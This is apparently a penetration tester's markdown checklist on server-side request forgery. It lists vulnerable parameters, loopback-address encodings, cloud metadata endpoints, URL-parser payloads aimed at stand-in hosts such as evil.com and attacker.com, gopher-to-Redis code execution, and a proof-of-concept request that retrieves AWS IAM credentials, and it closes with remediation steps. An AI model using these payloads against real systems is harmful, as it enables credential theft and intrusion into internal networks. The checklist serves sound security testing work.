# SSRF

Server-side request forgery. Goal: cross trust boundary, hit internal services or metadata.

## Where to look

- URL-accepting params: `url=`, `uri=`, `fetch=`, `src=`, `dest=`, `redirect=`, `callback=`, `webhook=`, `image=`, `next=`, `return=`, `path=`, `continue=`.
- Features: PDF/screenshot renderers, link previewers (OpenGraph), XML/SVG processors, webhooks, image proxies, import-by-URL, RSS fetchers, OAuth `redirect_uri` (server-side fetch of `/.well-known`).

## Confirm outbound

Burp Collaborator or interactsh:

```bash
interactsh-client -v
# poll for DNS/HTTP hits from:
# http://<your>.oast.pro/
```

Payload:
```
url=http://<your>.oast.pro/
url=//<your>.oast.pro
url=http://<your>.oast.pro@target.com/     # user-info trick
```

## Internal targets

```
http://127.0.0.1:/ , http://localhost/
http://0.0.0.0/
http://[::1]/
http://0177.0.0.1/     # octal
http://2130706433/     # decimal (127.0.0.1)
http://0x7f.0.0.1/     # hex
http://127.1/          # short form
http://spoofed.burpcollaborator.net/   # DNS that resolves to 127.0.0.1
```

Cloud metadata:
- AWS: `http://169.254.169.254/latest/meta-data/` (IMDSv1) — see `Checklists/Cloud/aws.md`
- GCP: `http://metadata.google.internal/computeMetadata/v1/` + `Metadata-Flavor: Google`
- Azure: `http://169.254.169.254/metadata/` + `Metadata: true`
- DigitalOcean: `http://169.254.169.254/metadata/v1/`
- Alibaba: `http://100.100.100.200/latest/meta-data/`
- Oracle: `http://192.0.0.192/latest/`

## Blind SSRF amplification

When response isn't returned:
- Time-based — internal port open vs closed differs by TCP RST vs connect time.
- Error-based — `http://127.0.0.1:22/` → "protocol mismatch" vs closed port → "connection refused".
- DNS exfil — `http://<secret>.<your>.oast.pro/` if response data is echoed in headers.

## URL parser differential (Orange Tsai)

Different components parse URLs differently. Classic payloads:

```
http://evil.com#@internal
http://evil.com?@internal
http://evil.com\@internal
http://internal%20.evil.com/
http://internal.evil.com/
http://[::evil.com]
http://0://evil.com:80@internal
http://foo@evil.com:80@internal
```

Check `a1.nz` or Orange Tsai's Blackhat talk for the full matrix.

## Protocol smuggling

- `gopher://` — send arbitrary TCP (SMTP, Redis, MySQL). Redis SSRF → RCE via `CONFIG SET dir /var/spool/cron/` + SSH key.
- `dict://` — port scan, Redis ops.
- `file://` — local file read (Java, PHP curl).
- `ftp://`, `ldap://`, `jar://` — language-specific.
- `php://filter/convert.base64-encode/resource=...` — PHP wrappers.

Gopher Redis RCE skeleton:
```
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aFLUSHALL%0d%0a*3%0d%0a$3%0d%0aSET%0d%0a...
```

Use `gopherus` to build payloads.

## DNS rebinding

Host returns `127.0.0.1` after first resolution. Useful when the app validates URL → resolves once → fetches with a second resolution window.

Services: `rbndr.us`, `lock.cmpxchg8b.com/rebinder`.

## Bypasses

- Redirect-based: host `https://attacker.com/` that 302s to `http://169.254.169.254/...`. Target follows redirects server-side.
- IP allowlist bypass via IPv6 `[::ffff:127.0.0.1]`, mixed-case host, Punycode.
- Schema in fragment: parsers that strip fragment after validation.

## PoC template

```
POST /preview HTTP/1.1
Host: target.com

url=http://169.254.169.254/latest/meta-data/iam/security-credentials/prod-role
```

Capture returned AWS creds. Validate with `aws sts get-caller-identity` and stop.

## Remediation

- Allowlist destinations, never blacklist.
- Resolve DNS once and reuse IP.
- Block RFC1918 + link-local + loopback + CGNAT + unique-local IPv6.
- Strip redirects or pin to same allowlist.
- Run fetchers in isolated network namespace with no cloud role.
- For cloud: enforce IMDSv2, set hop limit to 1.

## References

- PortSwigger SSRF — https://portswigger.net/web-security/ssrf
- Orange Tsai — https://github.com/orangetw/awesome-url-parsers
- SSRF Bible — https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM
- gopherus — https://github.com/tarunkant/Gopherus
